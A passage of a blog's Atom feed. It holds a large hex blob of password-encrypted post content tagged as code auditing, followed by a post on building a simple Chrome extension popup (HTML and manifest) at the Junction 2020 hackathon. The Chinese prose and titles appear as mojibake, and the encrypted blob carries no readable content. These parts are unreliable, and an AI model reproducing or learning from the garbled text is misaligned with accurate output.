33af1a561f743be3a574a09564ae8d4ae8f163181705a59b35c1efe9e12ab9346d43e5292cc9ab54d8c4b81d5ee9e1793ee019e23065e31c94cf9336a3d9640a682c01c92392f0ee014ebce588759a4b791909ea1e412b8274c2af5ebb27cf5b64933e0d49212b3a3db262c42d63bea14a6dfd0f58afe2ee8da97a6633d9dd5470e428e6463c8a8279f5a526b193fc587a24594d6329d7d6ce0ed580aa41b1efcd2f281f67d486233e5a6ec4744eaf5b76f2a4af6fd16ebf431dc5b0c99cf580b13a4aa829cace63c67f8febf662f1fa550fada691119dcf5c4ad234aa94b2e5b6a7368a6221698529a2660a653059a9035cdb3c18c844edc6039713003eba1f2776b0869b21c849f4fd74e7d145f85f3facead52c587453724b6ea6800e343660e91534d4bccc1b9c28289e0848dd1074355bfbcfc818daaffa0e16075b45126a7e291bfe398853f07654870b809fd8608ff18ef283b6e5890e9f0e45a02a2e086e0286a6648aefc04d3fc195a46f0ba3d2125b6153d92a39077958a136f89d30b636504b5bb82424b542d45783456729a5f054099add5c090da8c5066d6f53180e6f8585fefa2903b92f81235ef2a8c5c33439dfd4081bd6a012a586cdb495db450f1467d47079f1512ada6e58db1828a599f4c47048bbc4030e0763521faef42e7a633100cb104eba231c8602827f8eb3990cb479e67c9d6a09a15afdbfd927fa8fc92e3cd8c63ba86afa6b23ff67a37e5914415f2d7fef02b928d0b7e9ac24fd932ce9679dc6e8df0eb4d2f79c80eaaf00a8c4473efe31fae9e0c8fc9ee0ab6279c4e230aaf9a10d963cb0fcafdea510aac9bad4bbb95377cbe3942f519207547b04de18e65f85f43769d7a16c5462f83beb673d3d24d790cc569efcff5f1dbd68f6a05bfc4263c709003306c7b745a5cb019e3d9db6ac4ba3e4a1e8ca4bf07d3e0f23a4961595359d0e043a30658d4825900f3ff5715e9a0fddc2b259a9d319c39921ff86b2bb865587d445037adc6d7f7cdff73da979fc6fe15ca846b1db16f33eb6168a4668a9257d2c781a7a515aef5080686ea111d4bf7be3e2b0073a62ee435dc0d46c2e99351456f8fdc182514ea52d0bd4a1ee230fe8346e74b797fcffe0ef09863a01703918829ed96eefc32d945a55c21785ce146696ea1b3e73a7db091ae5c90a068bda9f3ded7b895582511ac2ee85fa5ec8d451cfcafc598b85ce3aaae822f38cad659ec35372415d76ba7181147d235e8acba6a94ff4c504c3dd38150d4afb48fdba1e9d46054e1d2859e54d21883cceffb177de361632de58a1cc4767e4f115ae45dcb48c2ede418e83470c4108fa007ac166ef0e6f25ce7b75987cfef1cfe7444b0eed539c82c3efb2511ffc90556f4bf99567c8632f129d5d9f9dba2765780b18e213a343d05825f0c516cf6d01875c40f96e20037ebc8ddf8d518ed38c642aae4e6243fdd549f2d172e4a5c89d2da06d02432500ccf7dab4c158e9e826b00c954b82b44fb9beac80616ddd38a9e18f252dc3594eb1a9fb58e97185556bb13bb8609198e3582985658674178640d7e06afda65989686877fddd2a347760e21e2cec458f379e959e708a963023c2d7551b58638c9ab759586d6a670d5d1318aa60ac7c74f7ef02ae6725223a8306c34347ea5166b4183f206380630714f205aa103834a9965aa04c1db4391bbabbd312f6cf06707bd06712aafeda8348e8b4b265a36ce72904523a0a6aced6630bf3e5b24501394e13f5ee9772e5b9d756234d989a2d6a65cf5e5db59a3d0210a1b72cd71f8e59b35086d866b4dc524787ca9626d5a9700f2e0799cc02a9564d9757e3dc3442d9250588d4ae1f21679d61f65801bbdb302d12cb929abb8e5051945390b8ce378f5061a8feb8f0c2b56c9dec9060ae153657ee044fa291a5a10ab13c5491ee6547707ff2409a17a352c23eb27e219cebdc900e126292d76b731e4faebb6e555dec5bf1779f3865a5bd82dad03ba0a526622e674cdae43d4e51f6360738999a7ebe9018bdce0e992163035bc5c6b4bf5d1d2e140a74b2e419c06538c56bdf722407e59f6cb7696057380f8c9bf406ece27dec5fdb10b10d282d6865a0f0ff51d0c9ac3f88a880fbaac7c4be6da8a450b6dffbd0b1f03e356c7007d90361a027486a14d1a7370cc0c76787a7a785a15ed9081056f8b3ebc70a4c1447fca90cc2f31332e5ddd979a7e44fecd677618aeab41e6132df0d00e0a17c776f9738bb280bf9c0eb49d156f588a8bfa2be6a99c24cc89603de69703c3e1b48a620b0e79e125ee718397317e598b4333509ce22a36a732b3959be88cb4e88c9c962ff255c7ed2d9a1a8c53c8040debd4e79a40ecf4ea7f334df0c594d95aeb04537ede7031b08f8620d1bee85a9cd63cdb8a1e7d8e3def48d4e320a3a4fdcc5bb4dd9f4b746112eb61bf0f994920cb975820e2b01d379541a16f473db6f3d9cb2097cbab06cebe86c95f97ea0c80e17e46cde252bef1362d87081fd909f015044ae2aca2358b539125ed091f47bc922dd3aad9140cf35edc152da6968d9047097fd19cfa947d1e84873215e2c35e77a34fcce84a963c4dc03b9bcabf4c0801cc33344632c1aca04033ef20b45d5843a9a831f142476b41d144faa0fa6a4f93b77b863bab2ec0ecf35209fd5949ccc8148b71530f911f66d32e8af80ab863ac2010a600376e834fd025cd206ab8c51d949a489685d90758d81dd533b741a60b7f3560d361ca922b486caa454454d52901f8d4cedbfafa6890b109e78e0d90b78502597435498f50646073e3fe16781efad4ac4e83e4a9b1a1d9fd6fb9c2a3be5da58976dd6c7c953e5fcc14a4e72dfdec95085a3c33160e3b5d6672d0050132df50e08df46cf126987e795ffcf1a49715ba6356515c0c595c88d763e5f68edbcfe1d035f28852e319555951fe31c11bd90b44e5554ea0143ff8ed26eaff6755ff6eb5fbb58d77ca31df7963daf88130fdcc0322cd04bb6d08a11bf4834ee54a8facdcc6616240a8cb319b7ce47fd9e1154deaee9bb6c3a0b4f21932e7e2eb282cf2f102d5334d0cbe8da9f1cc33903d6f759113210cd94093ac6b2557742295fc21db92a35263e4a48fe6ed052ac0606ebb1a0663f095d3e7ac8037fa20a32e7dbb0cdb097ddb8da930823384c9df9df09466ddfe4fd18cde3e78874da589dab0719b1ad934d28497ce9377596e30314fe740a61bb37d3be02fe10ff8dbb489f86c1f6dacc2ef9c1ce9686b7dcec39673d15835d33fd8b929690ad67934a272f6ccef179a442c38bd9ae7b7895d830c6c3c96e7fc7ed473d602d01c2dbe084bb800986d3d250c2b9d9ff2ea1afd3afa2b7fe3c9829156f2392941c93ce9169336ac9ceab5886d966744a7ad976c6d32236d46923f06c26e23f638ef3e2c1304fad0ba09b4bf9ee8734c47138a370191b694e0b47943e1b52b1b9f733ed3ef5d8c142c071420df33e02cf3e614a997e28553c3619d2657f3a1fe998311d3faa0b3aeaa79bc15692c73a14b097341f20580b81532094b431b2a5285e95c825b600b7998bee4a13a7e8256b5db1a0e18df2061f28a6c8a6e98eae491881b720db1a0c322ba20b8fce3940532400662bb55b05140226646ca763de4c474b94ad3c42fded4b744842bff19e0701c175ccbcae39621bdcb798b5b8bd0e4d99a2b5f6c10d91c2eb4e8186564cc80a8c7a725fcccf77f7f258e36028b96d21cfb44496aca70b4be7490382914c6b888a2d75960c0d6a7234f31b898f163da918808c55963fd22e6478b51f1f380caf7500b853a89a6f6864a297a35b415acfe41227d08fe4b99509da980f3ad943fe9123b85daa04d670aa86de79150c807a51b32bec381c9eac000528a4489124ea02ebb2a029af6f8a131001e1584a889954692d928c8edd021788f76ad59a1b0329c5e33c9657956e6124d654f592c930940e1e47dfbec70ea215fe03d0926bf3137f9bcd456ebd0e253355d18b81c81141a85c587071104ebb633a585d61b7961524c2146cc0e0f7adc1d3f52badea92844f747306703cec76bcb308b235ec204d5023474da6179efb6c5efbb9a83edf7f6100c0db96ce4effebed2ee957da73acc28446753f342a0f6f7d2483b1735e8767526093c4e943802c4dc55122d9dca8af4eff7a3429eecfc1f54f0ded3fef4fb63172c3e71fb6dfa6569ad5b8d89e205c2e9817407cb10393d461ef55e039bf8e7b9aa4e69732f00bbcca6638762a8ac996d82245e1fe9c7d66eef47e463581025bb4fc3bb5354ccb21b20c2d33ef28d457991a0f43b3002649f1713458115d0eb3bd2a46320fbabb3e18358d46f969e2ea99cda23902113c4d333b1a0c662253aebb4f837545b93084b3d89ec843eabda0eae717ed0edf3b60f84d47c9daee8b80d258e589cc308449227f057422361b39c48ec356b5a17f1aa4a301c8513fed127096d46e3f0537f611c0264ef842138d6e15260feef7a585ba2ee84af7f1d5420ddb0d4613b37a2119732c4c567e32569ddc2f932d2b1c37b590b09452086dac9cf9fc5ae4efaf19971285d505cd3bc880c8cd6ac7ae215f468396891794821fe0bc717dd72dc5b9b46b8ae9bfa74b418dd38a543f4d5c3ab88252e7fd9e38b14f6978890364d3f9d5387681961b07aee5764cc1cde937093de0b566dfb493772c758229bc22f49da2c0ddb9d7f36d5cb86fe6a47f75101f4e22536a8e6e02ce191fb973da3d99f66687af8569a550b05a59b1f829bc9043fb2d0e6282c71cbcd1ddd041013de49b725275b3d83735983383dc3d6a45a044d26c8fff94173cb58e3f97c2dd076affc32a76d2b804c4e9d9e9d88b996989798388d7a7cc514e525a23b9352bf92a161ef865f0fef71c77e68c1b65e21d4ff4c641d1ed039ea33517e2d491d510900596ab7754e41a028ff93d08324bf96a0afcd018118440595a70d466fe5d83f41606c79f6a67a0fefebe19431bdfafa38727c20aadad1ff9e66a381a58beb77e96262cd5fe75580b82ef44d4ee7d9bc86abc3620cea9a7167d0c80563bd2cba0037a0fa859e0d6762ae956e0e22b55155b3ee47fdbabad1d51830f2b8bb84ba4f0d494dabab2b7cf5b4b29769628d39d7d3a5c242df6d8454537c2fe5dac0bc7c1df1138f3ef39ced9d11260334fa2a40aa325c4aa1cd506932cedb7019d24469b91586438488ade5a97b6e61256517285162e208110aaab64e248d3d33e51258aebb5d5e0230a153f1bb4547d052f742a4ed20f2a23d74d88646a8aa627fa91367f86860ce0400ce04da5f3d2c05431207ca487278c314cea8123f93bd9b548b7571ea9a800d2edbbdfd035368ef2c83bde8400d3bf640bfef7b635dff0f003e9e6aaf7b476dd2f82e6f21235edcba0f7688685ae281c50c2d1f766a61fde5a5d1775df38b50970b7c656cdf957b5489735e0cb66d490cffdaa310f400a6ab2b8830e81a238a522011b659bd8564233ae2f15d3cf45c1d1332f1af3e6056dc4f8cd48ae5c471ebe52e0299ca2e183ca44182159e83248e3bc010cac18c55635d75a37167d00533952e00452c82141264e847c8152b860f9a8c2a0a74467ffa9d00cc08d0f5c8d286d02a736eaabf6bb1f33e437e67de4ceba408e596874a615b09b74f3c31a5d55930d3d4b9df97fd6d9085f01f8d460708bad5ea54791e8e8f96422d838509d091a2f9191ddc00d693bb135952a46ab6f4c5bcd5c0a61419eefa982d4112e006e40167cedd24f13d68cf8d985d05ce13efe3c9894d63d6ec46e606d1bd91c024d2adc06397aad9a08a960981a9095fa7075dda2a5fee7a47caaf18021136a213884a9568563d04233afb9c873eb05880b28232b746f38334cb63a71ba0a379411bacc248055f2dff9bedcd6b62ec99cb039f2e839cc338f11b3dbc5ee192440863a1ae2fc7aee2b9e02d5c3f7859cb20673405bc0cb9d64481e10af8c3948397d09b04cb3be98aa7048eb27f0cee045030079959c960d57171b69f7fc0d73c4343df04aac7044b68d784f5cd3e9615101c444fe2136999dfd2be6c877743868f2980a4db3a5e5c7360e6da7839d732946fa663b8d56ebfa7a0141deb48c6e76a2a13996defc953c70a9e6d2d61b851187708e907120987c6e161c934f63befc6b0754eff1fa80e1fcfff327418d8e215feff2838f8cdbdd295d24b043b0a412908f42205a09b9f3a618957af66c6ff63a26eb601ab68fb00d7f5123b284f94580289d5ed481e50d6d629ae13aeaaca68c53141e17d50eabe63a48be5036d8e9d0883c0b95bc85db3a46561e9c972ca436aa8aca53089de73e4c5832e7ce24a2804387098bff8ee25e7052e82e6aa950bd020f84b780d14b0a61fe2fd9626e289616cb36b96e10b2ec521e54cb3d80c535b8cf8d14d34d485530bc87d373746c4bb3be8d75d102ad4c45a306649e672ef8cf8f5f7607a983791935c0a3d60442c0ed9a4dd1ffd86fb1aa90e0adabce07c900f73d4ebb39edae77bdbb5be5f534fcbfe2e22fe225dac3b4e7e250b01ffd7703e3db7b8ad014466c7afff62da15482fdd0651d1ad6d298d41c28773411d77a23db7656e6b253160cb7dc1639fb40919e324ee21eee2b373180bc84b8b388994ca6e29464115b06021d3f76c9552cc9e083a8cfc58b00039593c363cbe62af4cea7503224e088c36a796d2a32cda185f963ddace332dfff03ba412ed9c2c5fe65c406c859cab74e04a609df265922daeb2f206daf9f8deb9afe35016522962c58b4710faa19b4aa40d903f58519f845a2fcf9996982cbe90ce2b22d2a3631cc386c75bc00c1f7329840322de58f08cef9c867f678d5bd5f9f117c600415fdad4359eaa64e527ae7b24e66854ff0dfacafca482cbf043e2ab0bae5a2b84359e2f24ab9bc7e799d8ed94abd4b579e92af8bcaf00d45dc55f3a83c4d2b1c3bafade86714291450131b925d3fe6d581f7005312cfa63fd23254e153000160d81ba6a6fd055e73a3218338eba7ead60302fba273b5eeb3e5d03dd240b9035c0d308f5b494369cbb1258e6c8b9db2366da895ec4a55b07417e5112c41de5398c90e17a61523968baef1a26515ce9fa85bd656434b362969e9e3ca4698799264199cd8057ae9955216eb9b2cb87e68b841f6767e9faa51921b945bd5b0355f59f030d22eaebc374f53a5bcb9bd97111ad9541b106d8e01cd8526e6f4a65d00d84bff8dc9dd588d85a1e5030540576cb2d6b11a4ffba06f3072eed645b74245d6fd96d6a30d1d6655bdb72fcab30765812f032dbaa8bd3fccf1a0412d723c195abee0a5ef91ac7f6ab4fbf32c282475aa63927d7619651fec6013b2b06e9bc164fbbd44dcded3f20ba5cdd1bbf7aa5c56e5765826cdfb0322ca255f31af96b6d381844140a75741c549c057ad915fa9db27f985bcb79128002525f89e1f17d91ca382df228ff045fd72c7207f48a51e147f879d079a23f4a11e04f0b78ba36e974edcead0d48d2424e023d390b24fc1c2946d4a7ee3c1d4d897f271b08938b6de4013067bbac0fbe673750ff29c7e112b35e1af5df5db0f2136b38011ed9ccd904a0509ccb27dc9e92a590c19ecd9b47e3cd33c5ef9e025c75771a3e7f02de679acee5452a75cf528516aa28486ec89795992abf7938cc21a7aa19559ad1d5c297cef1b6368d8703f9410d284cc245370c8ec0b09f0b0217737dd655857a434e337bd91e6facf326d2bdef23e2df4f3b84965b58f7e4f52690b99389e96805d902870e65f6c0be6f93edc467efd72e1c82fa6f7122551ad0c14e51156215859794f1a316c6b982a16105dc8c8c630b09d78899c4da60774cf6e91a4ce8c9d0e9f331098b0dc5a9c42b9577cf9e1309e8da11e355466b2cb7eb5f21c2d4038da0437f4f3780d3a90a99f7e52392294c8e5b25f8fb7224b1a65208546da7e02700b621849a7b812bd68262d12f1cb9fc28c8b5dd841bb26d7842f1e333140a816e6a59512629b587c47cbcaaa65fc4434253239c30de796c5140ae822dcf04adccf9d88e0ee14c50354952d9dada68b9676284305d9d4c1a6241c00ef7f47272f87ac9232604028f0590c9785421efb6be8ebaf7181becc00ece27bf1c816162ab964f86475d99ccd9c7be7ab7af13778ce517d4b92d17defc5f6786b2884e425b2608fc87974675f48c7bf883041b8014013cc1a99aeff76d8810cbe2649493ac8a74fc538b655de66680be621d5c5f9823981ce9d211c757d56ca97236711f7da81634fe0e5365525577d5d72629339d7a3db248576cc4cc70cb91f7c056bf6bb6bc753e9fc76ac8cb1cd656f196ec463695ef5dcc0f8a900f7d035244980327ed6d9381c3241ab5a34aff3c9d6da6415ac0c02ca566d1f0c193646c6677e22ff52534e67f708d1d625250ab0e2c92a0ceec69673a250909686189c8c2ab78799575ed03435b0c6fe638623598cc8666333e3e6fcd8fef0b64cf53c91bae09f1851bb1487cfdea1b27e4a9e9fc2978dc0a47003f6ba49467b57cb65e9dfa99e470d16a410139cf07718a048c3af0b3d9fe01ebe0df7b0dbeeb9ca1a7ff1b9f2a0ee979abef9530bc53a4d1053eaef49fc59216c19b4eaaa6aef42fe0334b54700da731e4624e29aa06f7135f8bd0eaa669b6bc14bb60475888b703c877ba998fae10e41013c9bae2dbbab1b4654dba6dee2360b5f095b0aa4786c2a5a33e65b81bf6a6c81470da9d78b6b5846196921daa2ebe4ff26bb4eaa6531c54181977105a2745e7731c0b5f8e1704f20aa5c8a4eea288da2bb762948c52e14984e06d7e816e5a8756b1b863480d4d1da85051483ec1f7c8e443469c9ae994d914e0e4a51c65467f1ddb3a3bd46a0ca54bdb49097d3af1151794f91f72cb946e62c9d671e817ea3134d81c4c4cb440e95d837c18fe0535661af8a7e14ff18d8b34b4aaf4ebc192d1cb80e4a44aa4d9038ac39ac0e05f893b53a0818e23a28abb722a460565ba6483cbcddfe6601b6ea87292b7ef332d3457505635c331c6058467137cd45adefa60c2ed9cc2a6aeb93106e4445c0227e8fb532beab7398f004cb3df886ab32bd68bdb8ea1ef3313623148be92dbe7b29f513bfc0afb3f2515b719d192cecba6533742be4ec57cc3b3b8646a382249b55d8abb486ba8edd28c00de46978f836194937f1a4daee3193168597b2bead7534b94eb0cf7eec7af2d8eec9de3f9eabefb088f870e0977d4fe1af995fdc7207862b63bc2f5294bd4fba869716ea403fb3ac527ff155adece484debc43839064cdb995bf34960508fd4c18871bd3694f8746cb4f13df1e6dbcab0907d5dd328054210ae2473dc051c237eef791b8f81816c86608dfe4529be5340aa38249cc8af499748f5b8789c4a1be4219806ec913d9f8af1ba1d69d38eca93dd53581832356a5ef229e824b77302f062ea36c8680c8fc88c91f745e45831ea986b86c7b28afd359fb75c3235c1039460b2345c3733c6cf105d5598c53acdae93d50569e71f157f47cd8466ee66af94b49b1aefcaf315c7ab21794f7c2b95101da56fb725f12f2a819cc3072c0e9851589e499dbce2dbbe56e284d0b1b1ab7c5fdadc16f02c64e23098cbfb612c640a51f4d47338c083f2031918dd065f966e75c26b5cc593aabc4511e3abcc83864b1ad91585dc37a13123c0d0639fc9becb6f19d5e45093c4600bbc973e218f4af7f125ad4f327c66c2eb45c9571870982db7c125d9d98a4dc5ccc2849c7efb5df014a2a715b38aa6adcc8a05e4fbe7400c2ded9d302dfa3be9a9caca1fd4acc6938219e4dfdd010a39e5bd815d748e41b75f118f10c1fe245096dda01727f2ec7fad70f16080e33504344bdf590af245ab0b76e48ab2fd59274904eeb76ac37142dca6ad6a298dee3635c467d840a4abd5accd04a57aafd081356f8ce9b9436da69dd85014f802adfc9a8b9e8dd746ce3d89ca604e554ada066dfb5fedbe832bfd8270556014999e804b77438349f4cbf62a2c07b91ae51290af110c62ba27820eb0bdf056ecae0647b7b537048e65adb901cd0edc1601a8b257098530536f65fba3dab8b9d0e77582a05b5b1b69f3e685239db1b821399323d9a0c4b0ba959ebdf13dd2474c540473ece483be74d5c984b7c79a3160ff13261d21230d2296f3b00176683149b7d8e3096a6692472364a5252dfed18186687435324cec33eeeb3c7fc6784c8001759c3bdb1b672f4d98802ecb682801ca1bc7801bb6cc6ce25532b27cee585b5b8793ecba2aab35c10675771347f3270e2fc1ec0c5b814dec9cc4edd5aa02310ada1ca35064839fc4f23106abcbc53e6b5cb7044fa42b47c8b721b00d88e1f421733700b1ab541c9403425421f885f410bd32359d8a2e05b182484b61f5a67014555f065f49ca2aa748836d1ace01e5af87c9a05c2cd9d26942a031bce3512d2dcc3a5b6eab89a2ba3158bc57a30a0605979936f9396065f5dae3aea306e723d27c9ba52e8929f5f1488234d4bb2915c7caeab9421e311d7796aa7e2c0bee2ecba02e87dd47d2b6eb590c788798ffc18bdcd704383e9aacc69e9dd019609b7e94e134bc4ef40ef67d61437b3eadff2da855cd5a2bfab3bb45becba946a692c48a0815e40b17f37989b534fe4912fb9df216ba247a45b6ed4a31e720b243a89f670dc165d17e9fdab04694e050f1cc7c084faf94b1048202583d8e13f75f06900bc19cb0a7cdab34394d6f3b8d3d5167548c237520b241e7b4e8e3fddaa86137dd09b44a504e1d5959676c904814f6a0b7249e63b809d13e33582732ac05375e39df8ebebb7a1d0d13088b3924293fb0dd60392bbb7858afde1a840f9103ab640a58286f97d3e00b01001d6210ed511c6a556cf0aa84bfe642a9b99c72507e3b36a361c9961ec0d4deb2d6f88f738ebcd84320d0afec5416e0736e7d87b8506f35510f4cfeb36d8987b48f3e9ffdc67798a918ae404f9693c02a907ed3f7e46441ee1dc0bb3c7ef4b1b2eaa7d86b19134e8f439cb68c40edf3a595c20ddf096715230ada066ffd9e9dbcde51ec96c56041701a258d6996bea870c46ed672ff32ba030e416b582f9598fa43c210923ba9bf5036654435282c676210334be17610503bb7448679f4a35cf59910e57e91a50d4115230091c385b73c020b3c32406e607b51e3c4b023a50a14bd685cce9a13d904d85f737a62286b47fa78635a3e97d3efd8d09993dcfc6f90039b7a9510f65f283d386db8ee700a11c1b45735a6167a2015e7c0d5b705ce27e5d5a85243c250112852cdc3217ce568804173bbe5c194dd4b346136656d35a6d5b53f7dde24b280bfe728f067dc2a850e4a4120f12e2723ec5a49ad3738e4faad47245cced1aaeec794996dde6925f1f011b1cbf664feef58e5e3915dae64aad5b8745d2511325d8893c4853fbbcdfef9f2e93b2cdc747b60319c9830d134be5a66a9cb0c7581eef0c9a8dfd236ab8b1cb840d51cb93b365c8c59e2c61a67bf6821b470674637af7dbbbe3892d084f36c0f795f27bcc9e212ee5b236165b3871d8f00378a91568384c8d7c4f50432bea525feab56f62c9e2ce25e59d367f04fe4646df490bc251c68cc908cab680785d0235d2eba3c8e9227761d1b4f54934d4bd7692cf54f8bf014e355581792d04856214376760a7426e7a40ff436723784207852c1e43c1b9345fec0c9ad71e45d184d1a52fbd593a780bd938a8dd90ba8b91c19da42dbe8590b531d778bd3eda277d52828ad62d2ddd39a72b318f1cd40b157f0fd68c3304ea76d22895869585c83fb14edb394b522236fe541e6eb6274887ebf2f63b651052baea0bcc07892cc24c607a1c82c73ad9692e68b0197c7bc2c19064a7a1f5275e7c27424135bd7e3e0d32f72868b412a62b2f3a408d58af84d592d55ada23b02a4bb3842533d7b839583a5c5326762bd00c0777f87f57c39d7a96c6d795e167fcf62e1d750fbca4a147ac73310f8b7ac903b51e775e783267095f10618cb7feb0422ed488fa3ff51c623b9176a312051ce110e617ddb6fbba218d5631237eb38bf0914a4dd185a13e7621b54f893d9b3e7135fba383d5f5b6eefa89280cd2e984139d38ba6ec4076507ba4a460f6c1c11db77a3d859b764fd36e7715c0975be9f636763f6b8da87eb36b2f7b726fb82e437e8f4c3ca4f5d2df46f9bb0a471e19a840e5572daa7cf8ddc755530d6caa3a48ceda02834295370d142e4e85ee31c906713bd119c52b346ce309d0e4e4f6d6fb69589e25275fceaab232fdd7f468374a23aa6f6b5811b296d43d56b98185e924f942fe4b6c85aa4eff9ee962439385a091bdb606f55dc5d4bfa30c555ca986885c5cbe228a54ded827ca374a3aa10fcd1a99cca5bd54532505bc43d8a415647c738ba5d725772baf8c230296354fcb82bb8d71ec99585ec0c1ef6aa04184e5a2ceed22589466ca425ada14fbd2d962e17e96af3b7c4eab9ffb20e2adf0c4ca6927cfaa0da909490f2aea1d25e88845129d4b52252cba7c95083e8c5391a14078aa542681aa6e749bb96f9aff9f81812c132c67cb5ad099029edb7ea699b33e83b8a8aebd50101312f61e26aa4e3f0b33899008d9bdd6bc7436471a8ea1ea</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">æœ‰ä¸œè¥¿è¢«åŠ å¯†äº†, è¯·è¾“å…¥å¯†ç æŸ¥çœ‹.</summary>
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Chrome æµè§ˆå™¨æ‰©å±•å¼€å‘åˆè¯•</title>
    <link href="https://hack-for.fun/62d1.html"/>
    <id>https://hack-for.fun/62d1.html</id>
    <published>2020-11-07T05:04:25.000Z</published>
    <updated>2020-11-08T05:43:39.809Z</updated>
    
    <content type="html"><![CDATA[<p>Junction 2020 ,æˆ‘ä»¬é˜Ÿä¼é€‰æ‹©äº†å¼€å‘æµè§ˆå™¨æ‹“å±•ï¼Œæˆ‘è´Ÿè´£å†™å‰ç«¯ã€‚</p><p>ä½†æ˜¯åé¢ç›´æ¥è‡ªé—­å’¯ï¼Œå°±æˆ‘å’ŒCyzåœ¨æã€‚<strong>é˜Ÿä¼åˆ†å·¥å½¢å¦‚è™šè®¾ã€‚</strong> </p><a id="more"></a><p>ç¬¬ä¸€æ¬¡å‚åŠ â€œå¼€å‘â€ç±»å‹çš„æ¯”èµ›ï¼Œä»¥ä¸»åŠ¨æ”¾å¼ƒå‘Šç»ˆã€‚</p><h1 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h1><p>æ€ç»´å¯¼å›¾ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201107164417.png" alt="image-20201107164415731"></p><p>æ–‡ä»¶å¤¹ç›®å½•æ ‘ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201107145226.png" alt="image-20201107144757481"></p><p>hello.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Junction Shop 2020<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        aaa</span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;test.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>manifest.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Junction 2020 Connected Shop&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span> : <span class="string">&quot;Junction Shop&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;manifest_version&quot;</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">&quot;browser_action&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;default_popup&quot;</span>: <span class="string">&quot;hello.html&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;default_icon&quot;</span>: <span class="string">&quot;apple-touch-icon.png&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;commands&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;_execute_browser_action&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;suggested_key&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;default&quot;</span>: <span class="string">&quot;Ctrl+Shift+O&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;mac&quot;</span>: <span class="string">&quot;Command+Shift+O&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Opens hello.html&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ•ˆæœå›¾ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201107145313.png" alt="image-20201107145132902"></p><p>è¿™ä¸ªæ•ˆæœåªæ˜¯ä¸€ä¸ªæ²¡æœ‰ä»»ä½•åŠŸèƒ½çš„HTMLå‰ç«¯ç½¢äº†ã€‚</p><p>ç„¶åæˆ‘æ‰“ç®—åŠ ä¸€äº›ç¬¬ä¸‰æ–¹æµè§ˆå™¨æ¡†æ¶ã€‚Google ä¸Šæ‰¾åˆ°äº†è¿™ä¸ªï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;EmailThis&#x2F;extension-boilerplate.git</span><br></pre></td></tr></table></figure><hr><p>Cyzä¹Ÿå’Œé˜Ÿå‹æ²Ÿé€šï¼Œé˜Ÿå‹æ— 